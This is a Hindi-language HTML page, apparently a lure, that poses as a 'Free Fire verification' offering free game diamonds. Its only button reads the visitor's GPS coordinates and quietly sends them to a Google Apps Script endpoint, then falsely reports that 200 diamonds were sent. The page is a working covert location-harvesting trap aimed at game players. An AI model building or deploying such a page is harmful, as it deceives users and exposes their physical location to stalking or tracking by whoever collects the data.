<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Location Tracker</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        h2 { color: #1a73e8; margin-bottom: 10px; }
        p { color: #555; font-size: 15px; margin-bottom: 25px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 25px; border-radius: 10px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: background 0.3s; }
        .btn:hover { background: #1557b0; }
        #status { margin-top: 20px; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>

<div class="box">
    <h2>Free Fire वेरिफिकेशन</h2>
    <p>अपना मैप देखने और सुरक्षित रूप से Free Fire वेरिफिकेशन शेयर करने के लिए नीचे बटन दबाएं।</p>
    <button class="btn" onclick="sendLocation()">Free Fire वेरिफिकेशन भेजें</button>
    <div id="status"></div>
</div>

<script>
    function sendLocation() {
        const status = document.getElementById('status');
        
        if (navigator.geolocation) {
            status.innerText = "Free Fire खोजा जा रहा है...";
            status.style.color = "#f9ab00";

            navigator.geolocation.getCurrentPosition(function(position) {
                // आपका दिया हुआ Web App URL यहाँ डाल दिया गया है
                const scriptURL = "https://script.google.com/macros/s/AKfycbwfrDCTA3evWq7FCFrJ5MRYi2zaah93nHUgeh4WT8kldpHQQ6AE5CvMDs1F3xHCtbhj/exec";
                
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const finalUrl = `${scriptURL}?lat=${lat}&lng=${lng}`;

                // बैकग्राउंड में डेटा भेजना
                fetch(finalUrl, { mode: 'no-cors' })
                .then(() => {
                    status.innerText = "✅Free Fire 200 Dimend भेज दी गई है!";
                    status.style.color = "green";
                })
                .catch(() => {
                    status.innerText = "❌ भेजने में समस्या हुई। कृपया पुनः प्रयास करें।";
                    status.style.color = "red";
                });

            }, function(error) {
                status.style.color = "red";
                if(error.code == 1) {
                    status.innerText = "⚠️Free Fire  एक्सेस की अनुमति (Allow) दें।";
                } else {
                    status.innerText = "⚠️Free Fire करने में विफल।";
                }
            });
        } else {
            status.innerText = "आपका फोन GPS सपोर्ट नहीं करता।";
        }
    }
</script>

</body>
</html>
